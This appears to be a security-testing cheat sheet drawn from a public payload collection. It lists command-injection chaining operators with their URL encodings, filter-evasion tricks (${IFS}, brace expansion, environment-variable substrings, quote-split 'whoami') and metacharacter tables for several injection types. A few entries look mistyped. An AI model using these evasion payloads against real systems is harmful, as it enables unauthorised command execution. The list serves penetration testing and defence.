github/swisskyrepo/payloadsallthings/command injection/readme.md

to inject an additional command to the intended one, we may use any of the following operators:

;           %3b                     Both
\n         %0a                     Both = new line
&          %26                     Both(second output generally shown first)
|           %7c                      Both (only second output is shown)
&&        %26%26              Both (only if the first succeeds)
||          %7c%7c               Second (only if the first fails)
\`\`          %60%60             Both (linux only)
$()       %24%28%29        Both(linux only  )
tab       %09
${IFS}                                Linux only

we can use the Bash Brace Expansion feature, which automatically adds spaces between arguments wrapped between braces, as follows
```
{ls,-la}
```

Linux

$PATH environment variable  /usr/local/bin:/usr/bin:/bin
you can use ${PATH:0:1}  to use the first character in the path TO GET /

$(TR '!-}' '"-~'<<<[) TO GET \

${LS_COLORS:10:1}   will resolve to ;

Windows

%HOMEPATH:~6,-11%    OUTPUTS \

POWERSHELL

$env:HOMEPATH[0]

$env:PROGRAMFILES[10]


Command obfusacation

```
w'h'o'am'i
```
```
w"h"o"am"i
```
number of quotes must be even

Common injection operators
SQL Injection                          ',;-- /  \*\**
Command injection                 ; &&*
LDAP Injection                         * () & |
XPath Injection                        ' or and not substring concat count
OS Command injection             ; & |
Code injection                           ' ; -- /* */ $ () ${} #{} %{} ^
Directory Traversal/File Path    ../ ..\\ %00
Object injection                         ; & |
XQuery Injection                       ' ; -- /* 8?
Shellcode Injection                   \x \u %u %n
Header Injection                       \n \r\n \t %0d %0a %09

**avoiding filters**


